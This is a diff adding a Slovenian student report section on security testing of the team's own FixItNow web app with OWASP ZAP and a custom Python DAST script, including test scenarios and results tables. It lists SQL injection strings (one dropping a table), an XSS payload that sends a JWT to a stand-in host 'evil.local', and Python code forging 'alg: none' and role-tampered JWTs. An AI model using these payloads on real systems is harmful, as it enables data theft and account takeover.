@@ -11,8 +11,8 @@ V skladu z navodili smo si člani ekipe razdelili **tri različne tipe sistemski
 | Član ekipe | Izbrano orodje | Tip sistemskega testiranja | Kratek povzetek fokusa testiranja na projektu FixItNow |
 | :--- | :--- | :--- | :--- |
 | **Luka Grobelnik** *(podrobno v tem poročilu)* | **Grafana k6** | **Testiranje obremenitve (*Load Testing*), stresno testiranje (*Stress Testing*) in testiranje nenadnih sunkov (*Spike Testing*)** | Preverjanje odzivnih časov, prepustnosti (*RPS*) in točke preloma zalednega REST API-ja pri sočasnem prostorskem iskanju izvajalcev, avtentikaciji (BCrypt + JWT) ter oddaji in pregledu servisnih zahtevkov. |
-| **Jan Mrkonjič** | **OWASP ZAP (*Zed Attack Proxy*)** | **Varnostno in penetracijsko testiranje (*Security & Vulnerability Testing – DAST*)** | Dinamično varnostno pregledovanje aplikacije, testiranje odpornosti proti napadom *SQL Injection*, *XSS*, *Broken Access Control* (IDOR na zahtevkih in računih), *Brute-Force* napadom na prijavo/2FA ter preverjanje varnostnih glav HTTP in CORS politike. |
-| **Alan Labaš** | **Locust + Docker Chaos (Pumba)** | **Testiranje vzdržljivosti (*Soak / Endurance Testing*), skalabilnosti in okrevanja po izpadu (*Recovery Testing*)** | Dolgotrajno enakomerno obremenjevanje sistema za odkrivanje puščanja pomnilnika (*Memory Leaks*) in izčrpanja baznih povezav (*HikariCP*) ter preverjanje samodejnega okrevanja ob začasnem izpadu ali zakasnitvah zabojnika PostgreSQL. |
+| **Jan Mrkonjič** *(podrobno v tem poročilu)* | **OWASP ZAP (*Zed Attack Proxy*)** | **Varnostno in penetracijsko testiranje (*Security & Vulnerability Testing – DAST*)** | Dinamično varnostno pregledovanje aplikacije, testiranje odpornosti proti napadom *SQL Injection*, *XSS*, *Broken Access Control* (IDOR na zahtevkih in računih), *Brute-Force* napadom na prijavo/2FA ter preverjanje varnostnih glav HTTP in CORS politike. |
+| **Alan Labaš** *(podrobno v tem poročilu)* | **Locust + Docker Chaos (Pumba)** | **Testiranje vzdržljivosti (*Soak / Endurance Testing*), skalabilnosti in okrevanja po izpadu (*Recovery Testing*)** | Dolgotrajno enakomerno obremenjevanje sistema za odkrivanje puščanja pomnilnika (*Memory Leaks*) in izčrpanja baznih povezav (*HikariCP*) ter preverjanje samodejnega okrevanja ob začasnem izpadu ali zakasnitvah zabojnika PostgreSQL. |
 
 ---
 
@@ -887,3 +887,303 @@ Dolgotrajno testiranje vzdržljivosti (*Soak Testing*) in testiranje okrevanja (
 - **Obseg uporabe:**
   1. Priprava testne skripte Locust (`naloga4/locustfile.py`) s sejami uporabnikov (`HttpUser`, `@task`) in integracijo testnih uporabnikov iz `seed_api.py`.
 - **Način verifikacije:** Vsi testi so bili dejansko izvedeni v spletnem vmesniku Locust (`http://localhost:8089`) in Docker okolju nad delujočo aplikacijo FixItNow, vse številke in posnetki zaslona pa izhajajo neposredno iz izvedenega testiranja.
+
+
+---
+
+## 8. Podrobna opredelitev sistemskega testiranja – Jan Mrkonjič (OWASP ZAP + DAST varnostno testiranje)
+
+### 8.1 Utemeljitev izbire orodja OWASP ZAP in varnostnega testiranja (DAST) za FixItNow
+
+Za svoj del sistemskega testiranja sem izbral **dinamično varnostno in penetracijsko testiranje (*Security & Vulnerability Testing – DAST*)** z uporabo odprtokodnega skenerja **OWASP ZAP (*Zed Attack Proxy*, različica `2.17.0` v okolju Docker)** v kombinaciji z namensko avtomatizirano DAST skripto v jeziku Python (`naloga4/fixitnow_security_test.py`).
+
+**Zakaj je varnostno testiranje (DAST) kritično za projekt FixItNow:**
+1. **Obdelava občutljivih osebnih, lokacijskih in finančnih podatkov:** Platforma FixItNow hrani domače naslove in natančne GPS koordinate strank (`locations`), telefonske številke, opise okvar v stanovanjih (npr. okvare ključavnic ali alarmov) ter bančne podatke izvajalcev (**IBAN** in **BIC** v tabeli `providers`, ki se pripenjajo k izpisu računa v `TicketService.attachProviderBankDetails`). Vsaka napaka pri kontroli dostopa (*Broken Access Control / IDOR*) neposredno ogrozi zasebnost uporabnikov.
+2. **Večplastna avtentikacija in avtorizacija na osnovi vlog (RBAC):** Sistem ločuje tri vloge (`CUSTOMER`, `PROVIDER`, `ADMIN`) ter uporablja brezstanjsko avtentikacijo z žetoni **JWT (`HS256`)**, osvežitvenimi žetoni (`refresh_tokens`) in dvofaktorsko avtentikacijo **TOTP 2FA**. Varnostni test mora preveriti, ali je mogoče podpis JWT žetona obiti (npr. napad `alg: none` ali sprememba polja `role: ADMIN`) ter ali so vse končne točke ustrezno zaščitene z anotacijami `@PreAuthorize`.
+3. **Javno izpostavljeni iskalni filtri in prostorske poizvedbe:** Končna točka `GET /api/v1/providers/search` je javno dostopna brez prijave (`permitAll()` v `SecurityConfig.java`) in sprejema prostobesedilni parameter `query`, kategorije ter geografske koordinate. Zato je primarna tarča napadov **SQL Injection (SQLi)** in **Parameter Fuzzing**.
+
+**Prednosti kombinacije OWASP ZAP + namenske DAST skripte:**
+- **OWASP ZAP Automation Framework (`zap-baseline.py` / `zap-api-scan.py`):** Samodejno preveri **68 uveljavljenih pravil pasivnega in aktivnega skeniranja** (varnostne glave HTTP, zastarele JS knjižnice s znanimi CVE ranljivostmi, razkritje napak strežnika `500`, piškotki, politike predpomnjenja in izolacija izvorov *Spectre/CORP*).
+- **Namenska DAST skripta (`fixitnow_security_test.py`):** Medtem ko splošni skenerji ne poznajo domenske logike aplikacije, naša skripta vzpostavi dve ločeni avtenticirani seji (*Stranka A – žrtev* in *Stranka B – napadalec*) ter sistematično izvede avtenticirane napade na poslovno logiko (**Horizontalni IDOR** med uporabnikoma A in B, **Vertikalno eskalacijo pravic** iz `CUSTOMER` v `ADMIN`/`PROVIDER`, manipulacijo JWT žetonov ter **Brute-Force** napade).
+
+---
+
+### 8.2 Kaj preverjamo: opredelitev varnostnih testnih scenarijev (`SEC-01` do `SEC-05`)
+
+Sistemsko varnostno testiranje je strukturirano v **pet zaokroženih varnostnih scenarijev (skupaj 21 ciljno usmerjenih DAST testnih primerov + 68 pravil skenerja OWASP ZAP)**, ki pokrivajo najkritičnejše kategorije po standardu **OWASP Top 10:2021**:
+
+#### Scenarij `SEC-01`: Odpornost proti vbrizgavanju kode (SQL Injection) in fuzzing vhodnih parametrov (*OWASP A03:2021 – Injection*)
+Preverjamo, ali je mogoče z zlonamernimi nizi v parametrih poizvedb in prijavnem obrazcu spremeniti logiko SQL stavkov v bazi PostgreSQL ali povzročiti neobvladano izjemo strežnika (`500 Internal Server Error`):
+1. **`SEC-01.1` (Boolean-based SQLi):** `GET /api/v1/providers/search?query=' OR '1'='1` – poskus obvoza filtriranja z vedno resničnim pogojem.
+2. **`SEC-01.2` (UNION-based SQLi):** `GET /api/v1/providers/search?query=' UNION SELECT null,email,password,null FROM users--` – poskus ekstrakcije zgoščenih gesel iz tabele `users`.
+3. **`SEC-01.3` (Stacked Queries SQLi):** `GET /api/v1/providers/search?query='; DROP TABLE tickets;--` – poskus veriženja destruktivnega DDL ukaza.
+4. **`SEC-01.4` (Time-based Blind SQLi):** `GET /api/v1/providers/search?query=' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--` – merjenje odzivnega časa za zaznavo slepega izvrševanja funkcije `pg_sleep(5)`.
+5. **`SEC-01.5` (Auth Bypass SQLi):** `POST /api/v1/auth/login` s telesom `{"email": "admin@fixitnow.si' OR '1'='1", "password": "' OR '1'='1"}`.
+6. **`SEC-01.6` (Parameter & Enum Fuzzing):** `GET /api/v1/providers/search?categories=INVALID_ENUM_SQL'&maxPrice=-500&minExperience=-10` – preverjanje varne validacije tipov brez razkritja sledi sklica (*Stack Trace*).
+
+#### Scenarij `SEC-02`: Odpornost proti medmrežnemu skriptanju (Stored / Reflected XSS) in HTML vbrizgavanju (*OWASP A03:2021 – XSS*)
+Preverjamo, kako zaledni strežnik in odjemalec obravnavata vnos izvršljivih JavaScript skript v besedilna polja:
+1. **`SEC-02.1` (Stored XSS v servisnem zahtevku):** `POST /api/tickets` z vsebino `<script>fetch('http://evil.local/steal?jwt='+localStorage.getItem('token'))</script>` v polju `description` in `<img src=x onerror=alert(document.domain)>` v polju `serviceType`. Preverjamo vrnjeni `Content-Type` in glavo `X-Content-Type-Options: nosniff`.
+2. **`SEC-02.2` (HTML/SVG Injection v uporabniški profil):** `PATCH /api/v1/users/me` z zlonamernim imenom `"firstName": "Boris<svg/onload=alert(1)>"` – preverjanje, ali strežniški DTO (`UpdateUserProfileRequest`) zavrne ali shrani surove HTML značke v bazo.
+
+#### Scenarij `SEC-03`: Kontrola dostopa – IDOR, vertikalna eskalacija pravic in integriteta JWT (*OWASP A01:2021 – Broken Access Control*)
+Preverjamo izolacijo podatkov med uporabniki in odpornost mehanizma JWT:
+1. **`SEC-03.1` (Nepooblaščen dostop brez žetona):** Klic `GET /api/tickets` brez glave `Authorization`.
+2. **`SEC-03.2` (Napad z nepodpisanim žetonom `alg: none`):** Klic `GET /api/v1/admin/users` s ponarejenim žetonom JWT (`{"alg": "none"}` in `"role": "ADMIN"`).
+3. **`SEC-03.3` (Manipulacija vsebine JWT žetona):** Sprememba polja `"role": "CUSTOMER"` v `"role": "ADMIN"` v dekodiranem payloadu veljavnega žetona ob ohranitvi prvotnega podpisa HMAC-SHA256.
+4. **`SEC-03.4` (Horizontalni IDOR – branje tujega zahtevka):** *Stranka A (žrtev)* ustvari zasebni zahtevek (`id = 1`). *Stranka B (napadalec)* s svojim veljavnim žetonom kliče `GET /api/tickets/1` in poskuša prebrati podrobnosti zahtevka, naslov ter bančne podatke izvajalca.
+5. **`SEC-03.5` (Horizontalni IDOR – preklic tujega zahtevka):** *Stranka B* poskuša preklicati zahtevek *Stranke A* prek `POST /api/tickets/1/cancel`.
+6. **`SEC-03.6` (Vertikalna eskalacija v `ADMIN`):** *Stranka B* (`role = CUSTOMER`) kliče skrbniški endpoint `GET /api/v1/admin/users`.
+7. **`SEC-03.7` (Vertikalna eskalacija v `PROVIDER`):** *Stranka B* (`role = CUSTOMER`) kliče izvajalski endpoint `GET /api/tickets/nearby?latitude=46.5576&longitude=15.6355&radiusKm=25`.
+
+#### Scenarij `SEC-04`: Odpornost avtentikacije proti Brute-Force napadom in naštevanju uporabnikov (*OWASP A07:2021 – Identification & Authentication Failures*)
+1. **`SEC-04.1` (Brute-Force napad na prijavo):** Zaporedno pošiljanje **20 neuspešnih poskusov prijave** (`POST /api/v1/auth/login`) z napačnimi gesli za obstoječi račun `sec.victim.a@mail.si`. Preverjamo, ali sistem sproži omejevanje hitrosti (`HTTP 429 Too Many Requests`) ali začasno zaklepanje računa (`HTTP 423 Locked`).
+2. **`SEC-04.2` (User Enumeration na `/api/v1/auth/forgot-password`):** Primerjava statusne kode in vsebine odgovora pri zahtevku za ponastavitev gesla za obstoječi in neobstoječi e-poštni naslov.
+
+#### Scenarij `SEC-05`: Varnostne glave HTTP, politika CORS, izpostavljenost dokumentacije in pregled ranljivih komponent (*OWASP A05:2021 & A06:2021 – OWASP ZAP Scan*)
+1. **`SEC-05.1` (Zaščita pred MIME-sniffingom in Clickjackingom):** Preverjanje prisotnosti glav `X-Content-Type-Options: nosniff` in `X-Frame-Options: DENY`.
+2. **`SEC-05.2` (Politika varnosti vsebine – CSP):** Preverjanje prisotnosti glave `Content-Security-Policy` in `Permissions-Policy`.
+3. **`SEC-05.3` (CORS Preflight napad):** Pošiljanje zahtevka `OPTIONS /api/v1/public/stats` z glavo `Origin: https://evil-attacker.example.com` za preverjanje, ali strežnik zavrne nepooblaščeno zunanjo domeno.
+4. **`SEC-05.4` (Javna izpostavljenost Swagger UI in ranljive JS knjižnice):** Preverjanje neavtenticiranega dostopa do `/swagger-ui/index.html` in `/v3/api-docs` ter pregled vključenih knjižnic JavaScript z vgrajenim detektorjem **Retire.js** v OWASP ZAP.
+
+---
+
+### 8.3 Pogoji izvajanja varnostnih testov
+
+#### 8.3.1 Strojno in programsko testno okolje
+- **Operacijski sistem:** Windows 11 Pro (64-bit), Docker Desktop `4.56.0` (WSL 2 Linux engine).
+- **Zaledni strežnik (SUT):** Java 25 LTS (`HotSpot 64-Bit Server VM`), Spring Boot `3.5.14` + Spring Security 6 (`http://localhost:8080`).
+- **Podatkovna baza:** PostgreSQL `16-alpine` v Docker zabojniku `backend_postgres` (`localhost:5433`).
+- **Orodji za varnostno testiranje:**
+  1. **OWASP ZAP `2.17.0` (`ghcr.io/zaproxy/zaproxy:stable`)** – zagnan prek *ZAP Automation Framework* (`zap-baseline.py`) z izvozom strukturiranega poročila v `naloga4/zap_report.json`.
+  2. **Avtomatizirana DAST skripta (`naloga4/fixitnow_security_test.py`, Python `3.13.5`)** – zagnana neposredno proti `http://localhost:8080` z izvozom meritev v `naloga4/rezultati_varnostni_testi.json`.
+
+#### 8.3.2 Arhitektura in potek varnostnega preizkusa
+
+```mermaid
+flowchart LR
+    subgraph Attacker["Testno okolje (Varnostni skenerji)"]
+        ZAP["OWASP ZAP 2.17.0\n(Spider + 68 Passive/Active Rules)"]
+        DAST["Python DAST Runner\n(SEC-01 do SEC-05: 21 napadov)"]
+    end
+    subgraph SUT["Sistem pod testom (FixItNow)"]
+        SEC["Spring Security Filter Chain\n(CORS + JwtAuthenticationFilter)"]
+        API["REST Kontrolerji + @PreAuthorize\n(Ticket, Auth, Admin, Provider, User)"]
+        DB[("PostgreSQL 16\n(Hibernate / JPA Criteria)")]
+    end
+    ZAP -->|"HTTP/REST + Swagger UI"| SEC
+    DAST -->|"SQLi, XSS, IDOR, JWT, Brute-Force"| SEC
+    SEC --> API --> DB
+```
+
+---
+
+### 8.4 Merjene metrike
+
+Pri sistemskem varnostnem testiranju merimo naslednje kvantitativne in kvalitativne metrike:
+1. **Število in stopnja tveganja odkritih ranljivosti (*Vulnerability Count by Severity*):**
+   - Klasifikacija po metodologiji OWASP ZAP: **High (`Risk 3`)**, **Medium (`Risk 2`)**, **Low (`Risk 1`)** in **Informational (`Risk 0`)**.
+2. **Delež uspešno prestanih varnostnih kontrol (*Security Control Pass Rate*):**
+   - Razmerje med številom uspešno blokiranih napadov (`PASSED`) in skupnim številom izvedenih DAST testnih primerov (`21 testov`) ter pasivnih pravil OWASP ZAP (`68 pravil`).
+3. **HTTP statusne kode pri varnostnih napadih:**
+   - Pričakovane kode zavrnitve (`400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `429 Too Many Requests`) v primerjavi z neželenimi kodami (`200 OK` ob nepooblaščenem dostopu ali `500 Internal Server Error` ob neobvladani izjemi).
+4. **Odzivni čas varnostnih mehanizmov (`durationMs`):**
+   - Čas obdelave pri Time-based Blind SQLi (`pg_sleep(5)` mora trajati $< 100\text{ ms}$, ne $> 5000\text{ ms}$) ter skupni čas izvajanja zaporednih BCrypt prijav pri Brute-Force napadu.
+
+---
+
+### 8.5 Kriteriji uspešnosti (*Security Gate* / SLA pragovi za presojo ustreznosti)
+
+| Varnostno področje (OWASP Top 10:2021) | Merjeni kazalnik / Metrika | Kriterij za **USPEŠNO (PASSED)** |
+| :--- | :--- | :--- |
+| **Odpornost proti SQL Injection (`A03:2021`)** | Število uspešnih SQLi vdorov ali zakasnitev `pg_sleep` v `SEC-01` | **0 uspešnih SQLi napadov** (100 % parametrizirane poizvedbe, odziv $< 500\text{ ms}$) |
+| **Zaščita pred proženjem XSS (`A03:2021`)** | Vrnjeni `Content-Type`, glava `nosniff` in sanitizacija HTML vnosov v `SEC-02` | `application/json` + `X-Content-Type-Options: nosniff` + **zavrnitev HTML značk v imenih** |
+| **Kontrola dostopa in preprečevanje IDOR (`A01:2021`)** | Dostop do tujih zahtevkov (`/api/tickets/{id}`) in skrbniških/izvajalskih točk v `SEC-03` | **100 % zavrnitev s `403 Forbidden`** (brez razkritja tujih zahtevkov ali statusov `500`) |
+| **Integriteta žetonov JWT (`A07:2021`)** | Odpornost proti `alg: none` in spremenjenemu payloadu (`role: ADMIN`) | **100 % zavrnitev neveljavnih podpisov (`401` / `403`)** |
+| **Zaščita pred Brute-Force napadi (`A07:2021`)** | Odziv na $\ge 20$ zaporednih napačnih prijav na `/api/v1/auth/login` v `SEC-04` | Sprožitev **`429 Too Many Requests`** ali začasnega zaklepa računa; **0 User Enumeration** |
+| **Varnostne glave, CORS in komponente (`A05` / `A06`)** | Opozorila skenerja OWASP ZAP (`High` / `Medium`) in CORS preflight test v `SEC-05` | Zavrnitev tujih CORS domen (`403`), prisotnost `CSP`, `X-Frame-Options` in **0 ranljivih JS knjižnic** |
+
+---
+
+### 8.6 Pripravljena skripta za avtomatizirano varnostno testiranje (`naloga4/fixitnow_security_test.py`)
+
+Spodnja skripta v jeziku Python ter ukaz za zagon **OWASP ZAP Automation Framework** v Docker zabojniku izvajata celoten nabor varnostnih testov `SEC-01` do `SEC-05`:
+
+```bash
+# 1. Zagon uradnega skenerja OWASP ZAP 2.17.0 (Automation Framework) v Dockerju
+docker run --rm -v "${PWD}/naloga4:/zap/wrk:rw" ghcr.io/zaproxy/zaproxy:stable \
+  zap-baseline.py -t "http://host.docker.internal:8080/swagger-ui/index.html" -J zap_report.json -I
+
+# 2. Zagon namenske DAST penetracijske skripte (SEC-01 do SEC-05, 21 testnih primerov)
+python naloga4/fixitnow_security_test.py
+```
+
+Izsek ključne logike iz skripte `naloga4/fixitnow_security_test.py` (celotna skripta se nahaja v mapi `naloga4/fixitnow_security_test.py`):
+
+```python
+def forge_jwt_alg_none(email):
+    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
+    payload = base64.urlsafe_b64encode(
+        json.dumps({"sub": email, "type": "access", "role": "ADMIN", "exp": 9999999999}).encode()
+    ).rstrip(b"=").decode()
+    return f"{header}.{payload}."
+
+def tamper_jwt_payload(valid_jwt):
+    parts = valid_jwt.split(".")
+    padded = parts[1] + "=" * (-len(parts[1]) % 4)
+    claims = json.loads(base64.urlsafe_b64decode(padded).decode("utf-8"))
+    claims["role"] = "ADMIN"
+    new_payload = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b"=").decode()
+    return f"{parts[0]}.{new_payload}.{parts[2]}"
+
+# Primer preverjanja Horizontalnega IDOR (SEC-03.4): Stranka B poskuša prebrati zahtevek Stranke A
+st, body, _, dur = http_request("GET", f"/api/tickets/{victim_ticket_id}", headers=auth_b)
+leaked = (st == 200 and "Zaupni podatki stranke A" in body)
+record(
+    "SEC-03.4", "SEC-03",
+    f"Horizontalni IDOR: Stranka B bere tuj zahtevek GET /api/tickets/{victim_ticket_id}",
+    "GET", f"/api/tickets/{victim_ticket_id}", st, dur, "403 Forbidden (dostop samo lastniku/izvajalcu)",
+    st in (403, 404) and not leaked, "High",
+    f"RANLJIVOST ODKRITA: Stranka B prejme HTTP {st} in celotno vsebino tujega zahtevka ter bančne podatke!"
+)
+```
+
+---
+
+## 9. Rezultati izvedenega varnostnega testiranja (Jan Mrkonjič – OWASP ZAP & DAST)
+
+Varnostno testiranje smo izvedli v dveh komplementarnih fazah nad lokalno zagnanim sistemom FixItNow (`http://localhost:8080` in `backend_postgres`):
+1. **Izvedba 1:** Avtomatizirano skeniranje z uradnim orodjem **OWASP ZAP `2.17.0`** (*Automation Framework*, 68 pravil pasivnega in aktivnega pregleda nad 13 odkritimi URL-ji).
+2. **Izvedba 2:** Izvedba **21 ciljno usmerjenih DAST napadov** na poslovno logiko, avtentikacijo in kontrolo dostopa s skripto `naloga4/fixitnow_security_test.py`.
+
+---
+
+### 9.1 Izvedba 1: Rezultati skeniranja z orodjem OWASP ZAP 2.17.0 (`zap_report.json`)
+
+Skener **OWASP ZAP 2.17.0** je s pajkom (*Spider*) preiskal javno dostopne končne točke in vmesnik Swagger UI (`13 URL-jev`) ter preveril **68 varnostnih pravil**. Od tega je bilo **60 pravil uspešno prestanih (`PASS` – 88,2 %)**, pri **8 pravilih (`WARN-NEW` – 11,8 %)** pa je skener zaznal varnostna opozorila (skupaj 10 posameznih kategorij opozoril v `zap_report.json`):
+
+![Poročilo skenerja OWASP ZAP 2.17.0 in porazdelitev opozoril po stopnji tveganja](slike/zap_1_owasp_porocilo_pregled.png)
+
+#### Tabelarični pregled zaznanih opozoril skenerja OWASP ZAP 2.17.0
+
+| Koda pravila (Plugin ID) | Stopnja tveganja (Confidence) | Naziv opozorila v OWASP ZAP | CWE / OWASP Top 10 | Št. pojavitev | Prizadeta končna točka in dokaz (*Evidence*) |
+| :---: | :---: | :--- | :---: | :---: | :--- |
+| **`[10003]`** | 🔴 **High** *(Medium)* | **Vulnerable JS Library (Powered by Retire.js)** | `CWE-1395`<br>*A06:2021* | 1 | `GET /swagger-ui/swagger-ui-bundle.js` vsebuje zastarelo knjižnico **`DOMPurify 3.1.4`**, ranljivo za več XSS obvozov (`CVE-2025-26791`, `GHSA-vhxf-7vqr-mrjg`). |
+| **`[10038]`** | 🟠 **Medium** *(High)* | **Content Security Policy (CSP) Header Not Set** | `CWE-693`<br>*A05:2021* | 1 | `GET /swagger-ui/index.html` – odgovor strežnika ne vsebuje varnostne glave `Content-Security-Policy`. |
+| **`[90022]`** | 🟡 **Low** *(Medium)* | **Application Error Disclosure** | `CWE-550`<br>*A05:2021* | 1 | `GET /swagger-ui` in `GET /v3/api-docs` vrneta **`HTTP/1.1 500 Internal Server Error`** zaradi nezdružljivosti med Spring Boot `3.5.14` in `springdoc-openapi:2.6.0`. |
+| **`[90004]`** | 🟡 **Low** *(Medium)* | **Cross-Origin-Resource / Embedder / Opener-Policy Header Missing** | `CWE-693`<br>*A05:2021* | 7 | `GET /api/v1/providers/search` in `/swagger-ui/*` – manjkajo glave `Cross-Origin-Resource-Policy` (`CORP`), `COEP` in `COOP` proti napadom stranskih kanalov (*Spectre*). |
+| **`[10063]`** | 🟡 **Low** *(Medium)* | **Permissions Policy Header Not Set** | `CWE-693`<br>*A05:2021* | 4 | `GET /swagger-ui/index.html` – manjka glava `Permissions-Policy` za omejitev dostopa do brskalniških senzorjev (lokacija, kamera, mikrofon). |
+| **`[10096]`** | 🟡 **Low** *(Medium)* | **Timestamp Disclosure – Unix** | `CWE-200`<br>*A01:2021* | 5 | `GET /swagger-ui/swagger-ui-standalone-preset.js` – prisotnost Unix časovnih žigov v odgovorih. |
+| **`[10049]`** | 🔵 **Informational** | **Non-Storable Content** | `CWE-524` | 5 | `Cache-Control: no-cache, no-store, max-age=0, must-revalidate` – Spring Security pravilno preprečuje predpomnjenje občutljivih API odgovorov. |
+| **`[10109]`** | 🔵 **Informational** | **Modern Web Application** | — | 1 | Zaznana sodobna enostranska spletna arhitektura (SPA / JavaScript). |
+
+---
+
+### 9.2 Izvedba 2: Rezultati 21 ciljno usmerjenih DAST testov (`fixitnow_security_test.py`)
+
+V drugi fazi smo zagnali skripto `naloga4/fixitnow_security_test.py`, ki je v **6,04 sekunde** izvedla **21 specializiranih varnostnih testov** v sklopih `SEC-01` do `SEC-05`. Od 21 testov jih je **13 uspelo (`PASSED` – 61,9 %)**, pri **8 testih (38,1 %)** pa je skripta odkrila dejanske varnostne ranljivosti v izvorni kodi zaledja (**1 visoko tveganje – High**, **3 srednja tveganja – Medium** in **4 nizka tveganja – Low**):
+
+![Matrika rezultatov 21 DAST varnostnih testov v sklopih SEC-01 do SEC-05](slike/zap_2_dast_rezultati_matrika.png)
+
+#### Celovita tabela izmerjenih rezultatov po testnih primerih (`SEC-01.1` do `SEC-05.4`)
+
+| ID testa | Sklop | Metoda in končna točka | Preverjani varnostni scenarij / Vektor napada | Dejanski HTTP status | Čas (`ms`) | Pričakovani odziv | Status in ugotovitev |
+| :---: | :---: | :--- | :--- | :---: | :---: | :--- | :---: |
+| **`SEC-01.1`** | `SEC-01` | `GET /api/v1/providers/search` | SQLi Boolean tautologija (`query=' OR '1'='1`) | `200 OK` | 29,5 ms | `200 OK` (0 zadetkov) | **PASSED** ✓ |
+| **`SEC-01.2`** | `SEC-01` | `GET /api/v1/providers/search` | SQLi `UNION SELECT null,email,password...` | `200 OK` | 31,6 ms | `200 OK` (0 zadetkov) | **PASSED** ✓ |
+| **`SEC-01.3`** | `SEC-01` | `GET /api/v1/providers/search` | SQLi Stacked Query (`'; DROP TABLE tickets;--`) | `200 OK` | 29,7 ms | `200 OK` (brez izbrisa) | **PASSED** ✓ |
+| **`SEC-01.4`** | `SEC-01` | `GET /api/v1/providers/search` | Time-based Blind SQLi (`pg_sleep(5)`) | `200 OK` | **33,2 ms** | `< 500 ms` (brez spanja) | **PASSED** ✓ |
+| **`SEC-01.5`** | `SEC-01` | `POST /api/v1/auth/login` | SQLi avtentikacijski obvoz v polju `email` | `400 Bad Request` | 22,6 ms | `400` / `401` | **PASSED** ✓ |
+| **`SEC-01.6`** | `SEC-01` | `GET /api/v1/providers/search` | Parameter Fuzzing (`categories=INVALID_ENUM_SQL'`) | `400 Bad Request` | 16,3 ms | `400` (brez Stack Trace) | **PASSED** ✓ |
+| **`SEC-02.1`** | `SEC-02` | `POST /api/tickets` | Stored XSS `<script>fetch(...)</script>` v opisu zahtevka | `201 Created` | 34,3 ms | JSON + `nosniff` glava | **PASSED** ✓ |
+| **`SEC-02.2`** | `SEC-02` | `PATCH /api/v1/users/me` | Vnos `<svg/onload=alert(1)>` v polje `firstName` | **`200 OK`** | 36,7 ms | `400 Bad Request` | 🟡 **RANLJIVOST (Low)** |
+| **`SEC-03.1`** | `SEC-03` | `GET /api/tickets` | Nepooblaščen klic brez glave `Authorization` | `403 Forbidden` | 17,6 ms | `401` / `403` | **PASSED** ✓ |
+| **`SEC-03.2`** | `SEC-03` | `GET /api/v1/admin/users` | Ponarejen nepodpisan JWT žeton (`alg: none`, `ADMIN`) | `403 Forbidden` | 2,0 ms | `401` / `403` | **PASSED** ✓ |
+| **`SEC-03.3`** | `SEC-03` | `GET /api/v1/admin/users` | Manipuliran JWT payload (`role: ADMIN`, neveljaven podpis) | `403 Forbidden` | 15,3 ms | `401` / `403` | **PASSED** ✓ |
+| **`SEC-03.4`** | `SEC-03` | `GET /api/tickets/1` | **Horizontalni IDOR:** Stranka B bere tuj zahtevek Stranke A | **`200 OK`** | 19,9 ms | `403 Forbidden` | 🔴 **RANLJIVOST (High)** |
+| **`SEC-03.5`** | `SEC-03` | `POST /api/tickets/1/cancel` | **Horizontalni IDOR:** Stranka B kliče preklic tujega zahtevka | **`500 Error`** | 35,4 ms | `403 Forbidden` | 🟡 **RANLJIVOST (Low)** |
+| **`SEC-03.6`** | `SEC-03` | `GET /api/v1/admin/users` | **Vertikalna eskalacija:** `CUSTOMER` kliče skrbniški endpoint | **`500 Error`** | 28,1 ms | `403 Forbidden` | 🟡 **RANLJIVOST (Low)** |
+| **`SEC-03.7`** | `SEC-03` | `GET /api/tickets/nearby` | **Vertikalna eskalacija:** `CUSTOMER` kliče izvajalski endpoint | **`200 OK`** | 45,5 ms | `403 Forbidden` | 🟠 **RANLJIVOST (Medium)** |
+| **`SEC-04.1`** | `SEC-04` | `POST /api/v1/auth/login` | **Brute-Force napad:** 20 zaporednih napačnih prijav | **`20× 401`** | 4.957,9 ms | `429 Too Many Requests` | 🟠 **RANLJIVOST (Medium)** |
+| **`SEC-04.2`** | `SEC-04` | `POST /api/v1/auth/forgot-password` | Preverjanje naštevanja uporabnikov (*User Enumeration*) | `200 OK` | 18,0 ms | Identičen odgovor `200` | **PASSED** ✓ |
+| **`SEC-05.1`** | `SEC-05` | `GET /api/v1/public/stats` | Prisotnost glav `X-Content-Type-Options` in `X-Frame-Options` | `200 OK` | 41,4 ms | `nosniff` + `DENY` | **PASSED** ✓ |
+| **`SEC-05.2`** | `SEC-05` | `GET /api/v1/public/stats` | Prisotnost varnostne glave `Content-Security-Policy` (CSP) | **`200 OK`** | 41,4 ms | Nastavljena glava `CSP` | 🟠 **RANLJIVOST (Medium)** |
+| **`SEC-05.3`** | `SEC-05` | `OPTIONS /api/v1/public/stats` | CORS preflight napad z domene `https://evil-attacker.example.com` | `403 Forbidden` | 1,8 ms | `403` (brez `ACAO` glave) | **PASSED** ✓ |
+| **`SEC-05.4`** | `SEC-05` | `GET /swagger-ui/index.html` | Javna izpostavljenost Swagger UI vmesnika brez avtentikacije | **`200 OK`** | 7,6 ms | `401` / `403` v produkciji | 🟡 **RANLJIVOST (Low)** |
+
+---
+
+### 9.3 Zbirni pregled izpolnjevanja varnostnih kriterijev uspešnosti (*Security Gate*)
+
+| Varnostni sklop | Št. testov | Uspešni (`PASSED`) | Odkrite ranljivosti | Presoja sklopa | Povzetek stanja v sistemu FixItNow |
+| :--- | :---: | :---: | :---: | :---: | :--- |
+| **`SEC-01`: SQL Injection & Fuzzing** | 6 | **6 / 6 (100 %)** | 0 | **PASSED ✓** | Popolna zaščita pred vsemi vrstami SQLi zaradi parametriziranih poizvedb JPA Criteria API (`ProviderSpecification.java`). |
+| **`SEC-02`: XSS & HTML sanitizacija** | 2 | **1 / 2 (50 %)** | 1 *(Low)* | **DELNO ⚠** | API vrača `application/json` + `nosniff` in React ubeži izpis, vendar zaledje dovoli shranjevanje surovih HTML značk (`<svg/onload=...>`) v `firstName`. |
+| **`SEC-03`: Kontrola dostopa (IDOR & RBAC)** | 7 | **3 / 7 (43 %)** | 4 *(1 High, 1 Med, 2 Low)* | **FAILED ✗** | JWT verifikacija je neprebojna, vendar je odkrit **kritičen Horizontalni IDOR na `GET /api/tickets/{id}`** in manjkajoča avtorizacija na `/api/tickets/nearby`. |
+| **`SEC-04`: Avtentikacija & Brute-Force** | 2 | **1 / 2 (50 %)** | 1 *(Medium)* | **DELNO ⚠** | *User Enumeration* je preprečen, vendar na `/api/v1/auth/login` in `/2fa/verify` ni nobenega omejevanja hitrosti (*Rate Limiting*). |
